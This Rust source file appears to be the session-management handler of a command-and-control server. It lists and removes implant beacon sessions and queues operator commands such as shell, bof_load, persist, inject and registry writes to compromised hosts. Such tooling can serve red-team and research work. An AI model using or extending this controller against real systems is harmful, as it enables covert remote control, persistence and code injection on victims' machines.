//! Session Handler
//! Handle session management API requests

use crate::{
    server::{Server, ServerState},
    session::{BeaconData, Session, SessionStatus},
    command::CommandType,
};

use axum::{Json, extract::{State, Path}, http::StatusCode};
use serde::{Deserialize, Serialize};
use std::sync::Arc;

#[derive(Debug, Serialize, Deserialize)]
pub struct SessionInfo {
    pub id: String,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub arch: String,
    pub pid: u32,
    pub process: String,
    pub integrity: String,
    pub first_seen: i64,
    pub last_seen: i64,
    pub checkins: u64,
    pub status: String
}

#[derive(Debug, Deserialize)]
pub struct CommandRequest {
    pub command_type: String,
    pub args: Vec<String>,
    pub timeout: Option<u64>
}

#[derive(Debug, Deserialize)]
pub struct CommandResponse {
    pub id: String,
    pub status: String
}


pub async fn list_sessions(State(state): State<Arc<ServerState>>) -> Result<Json<Vec<SessionInfo>>, StatusCode> {
    let sessions: Vec<Session> = state.sessions.list().await;
    let info: Vec<SessionInfo> = sessions.into_iter().map(|s: Session| s.into()).collect();
    Ok(Json(info))
}

pub async fn get_session(State(state): State<Arc<ServerState>>, Path(id): Path<String>) -> Result<Json<SessionInfo>, StatusCode> {
    let session: Session = state.sessions.get(&id).await.ok_or(StatusCode::NOT_FOUND)?;
    Ok(Json(session.into()))
}

pub async fn remove_session(State(state): State<Arc<ServerState>>, Path(id): Path<String>) -> Result<StatusCode, StatusCode> {
    state.sessions.remove(&id).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    log::info!("Session {} removed", id);
    Ok(StatusCode::OK)
}

pub async fn send_command(State(state): State<Arc<ServerState>>, Path(id): Path<String>, Json(cmd): Json<CommandRequest>) -> Result<Json<CommandResponse>, StatusCode> {
    let session: Option<Session> = state.sessions.get(&id).await;
    if session.is_none() {
        return Err(StatusCode::NOT_FOUND);
    }

    let command_type = match cmd.command_type.as_str() {
        "shell" => CommandType::Shell,
        "download" => CommandType::Download,
        "upload" => CommandType::Upload,
        "screenshot" => CommandType::Screenshot,
        "ps" => CommandType::Ps,
        "kill" => CommandType::Kill,
        "bof_load" => CommandType::BofLoad,
        "sysinfo" => CommandType::Sysinfo,
        "sleep" => CommandType::Sleep,
        "exit" => CommandType::Exit,
        "ls" => CommandType::Ls,
        "cd" => CommandType::Cd,
        "pwd" => CommandType::Pwd,
        "rm" => CommandType::Rm,
        "cp" => CommandType::Cp,
        "mv" => CommandType::Mv,
        "reg_read" => CommandType::RegRead,
        "reg_write" => CommandType::RegWrite,
        "persist" => CommandType::Persist,
        "inject" => CommandType::Inject,
        _ => return Err(StatusCode::BAD_REQUEST),    
    };
    
    let command = state.commands.queue(&id, command_type, cmd.args, cmd.timeout).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    Ok(Json(CommandResponse { id: command.id, status: "queued".to_string() }))
}

#[cfg(debug_assertions)]
pub async fn register_test_session(
    State(state): State<Arc<ServerState>>,
    Json(data): Json<BeaconData>,
) -> Result<Json<SessionInfo>, StatusCode> {
    let session = state.sessions.register(&data).await.map_err(|e| {
        log::error!("Failed to register test session: {}", e);
        StatusCode::INTERNAL_SERVER_ERROR
    })?;

    Ok(Json(session.into()))
}

impl From<Session> for SessionInfo {
    fn from(session: Session) -> Self {
        Self {
            id: session.id,
            hostname: session.hostname,
            username: session.username,
            os: session.os,
            arch: session.arch,
            pid: session.pid,
            process: session.process,
            integrity: session.integrity,
            first_seen: session.first_seen,
            last_seen: session.last_seen,
            checkins: session.checkins,
            status: match session.status {
                SessionStatus::Active => "active",
                SessionStatus::Dead => "dead",
                SessionStatus::Stale => "stale",
            }
            .to_string(),
        }
    }
}
